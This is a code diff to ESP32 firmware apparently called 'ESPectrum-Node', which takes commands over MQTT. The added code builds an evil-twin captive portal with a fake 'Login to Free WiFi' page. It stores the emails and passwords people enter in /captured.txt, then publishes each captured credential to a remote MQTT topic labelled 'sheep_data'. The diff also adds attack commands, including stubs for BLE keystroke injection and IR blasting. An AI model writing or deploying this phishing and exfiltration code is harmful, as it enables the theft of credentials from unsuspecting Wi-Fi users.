@@ -106,6 +106,50 @@ void sniffer_callback(void* buf, wifi_promiscuous_pkt_type_t type) {
   }
 }
 
+// ================= SETUP =================
+void setup() {
+  Serial.begin(115200);
+  pinMode(2, OUTPUT); // Built-in LED
+  
+  // Init File System
+  if (!LittleFS.begin(true)) {
+    Serial.println("LittleFS Mount Failed");
+  } else {
+    Serial.println("LittleFS Mounted");
+  }
+
+  // Init BLE
+  NimBLEDevice::init("ESPectrum-Node");
+
+  // Init WiFi & MQTT
+  setupWiFi();
+  client.setServer(mqtt_server, mqtt_port);
+  client.setCallback(callback);
+  client.setBufferSize(MQTT_BUFFER_SIZE);
+  
+  // Evil Twin Web Server Routes
+  webServer.on("/", HTTP_ANY, []() {
+      webServer.send(200, "text/html", "<h1>Login to Free WiFi</h1><form action='/login' method='POST'><input type='text' name='user' placeholder='Email'><br><input type='password' name='pass' placeholder='Password'><br><input type='submit'></form>");
+  });
+  webServer.on("/login", HTTP_POST, []() {
+      String user = webServer.arg("user");
+      String pass = webServer.arg("pass");
+      Serial.println("CREDENTIALS: " + user + ":" + pass);
+      
+      File f = LittleFS.open("/captured.txt", "a");
+      f.println(user + ":" + pass);
+      f.close();
+      
+      // Virtual Live Feedback
+      Serial.println("CRED_SAVED: " + user);
+      
+      webServer.send(200, "text/html", "<h1>Connecting... please wait.</h1>");
+  });
+  webServer.onNotFound([]() {
+      webServer.send(200, "text/html", "<h1>Login to Free WiFi</h1><form action='/login' method='POST'><input type='text' name='user' placeholder='Email'><br><input type='password' name='pass' placeholder='Password'><br><input type='submit'></form>");
+  });
+}
+
 // ================= LOOP =================
 void loop() {
   unsigned long now = millis();
@@ -166,7 +210,13 @@ void callback(char* topic, byte* payload, unsigned int length) {
   StaticJsonDocument<2048> doc; // Incoming command doc
   DeserializationError error = deserializeJson(doc, payload, length);
 
-  if (error || String(topic) == topic_chat) return;
+  if (error) return;
+
+  if (String(topic) == topic_chat) {
+      Serial.printf("CHAT: %s\n", doc["text"].as<const char*>());
+      // Handle incoming chat (e.g. flash LED)
+      return;
+  }
 
   const char* type = doc["type"];
   const char* action = doc["action"];
@@ -188,6 +238,23 @@ void callback(char* topic, byte* payload, unsigned int length) {
         currentMode = MODE_IDLE;
         client.publish(topic_data, "{\"type\":\"status\",\"msg\":\"Sniffer Stopped\"}");
     }
+    else if (strcmp(action, "ping") == 0) {
+        client.publish(topic_data, "{\"type\":\"status\",\"msg\":\"PONG\"}");
+    }
+    else if (strcmp(action, "deep_sleep") == 0) {
+        int duration = doc["params"]["duration"] | 30;
+        
+        StaticJsonDocument<128> report;
+        report["type"] = "status";
+        report["msg"] = "Entering Sleep Mode";
+        String out;
+        serializeJson(report, out);
+        client.publish(topic_data, out.c_str());
+        
+        delay(500); // Give MQTT time to send
+        esp_sleep_enable_timer_wakeup(duration * 1000000ULL);
+        esp_deep_sleep_start();
+    }
     else if (strcmp(action, "start_attack") == 0) {
       attackType = doc["params"]["type"].as<String>();
       int duration = doc["params"]["duration"] | 10;
@@ -199,6 +266,21 @@ void callback(char* topic, byte* payload, unsigned int length) {
           currentMode = MODE_EVIL_TWIN;
           startEvilTwin();
       }
+    }
+    // Phase 5: Hardware Tools
+    else if (strcmp(action, "ble_hid_key") == 0 || strcmp(action, "ble_hid_type") == 0) {
+        client.publish(topic_data, "{\"type\":\"status\",\"msg\":\"HID Cmd Received (Needs BleKeyboard Lib)\"}");
+        // Logic: if type=='ble_hid_key' -> bleKeyboard.write(KEY_...)
+        // Logic: if type=='ble_hid_type' -> bleKeyboard.print(params["text"])
+    }
+    else if (strcmp(action, "ir_blast_power") == 0) {
+        client.publish(topic_data, "{\"type\":\"status\",\"msg\":\"IR Blast (Needs IRremote Lib)\"}");
+        // Logic: irsend.sendSony(0xa90, 12); (Example)
+    }
+    else if (strcmp(action, "toggle_led") == 0) {
+        bool state = doc["params"]["state"];
+        digitalWrite(2, state ? HIGH : LOW);
+        client.publish(topic_data, state ? "{\"type\":\"status\",\"msg\":\"LED ON\"}" : "{\"type\":\"status\",\"msg\":\"LED OFF\"}");
     }
   }
   else if (strcmp(type, "file_cmd") == 0) {
@@ -235,6 +317,24 @@ void stopAttack() {
    // Reconnect to station
    setupWiFi();
    // MQTT will reconnect in loop
+   
+   // Phase 5: Broadcast captured credentials to Wall of Sheep
+   if (LittleFS.exists("/captured.txt")) {
+       File f = LittleFS.open("/captured.txt", "r");
+       while(f.available()){
+           String line = f.readStringUntil('\n');
+           if (line.length() > 0) {
+               StaticJsonDocument<256> sheep;
+               sheep["type"] = "sheep_data";
+               sheep["content"] = line;
+               sheep["ip"] = "CAPTURED";
+               String out;
+               serializeJson(sheep, out);
+               client.publish(topic_data, out.c_str());
+           }
+       }
+       f.close();
+   }
 }
 
 // ================= TASKS =================
@@ -398,6 +498,8 @@ void sendSensorData() {
 }
 
 // ================= HELPER =================
+
+
 void setupWiFi() {
   WiFi.mode(WIFI_STA);
   WiFi.begin(ssid, password);
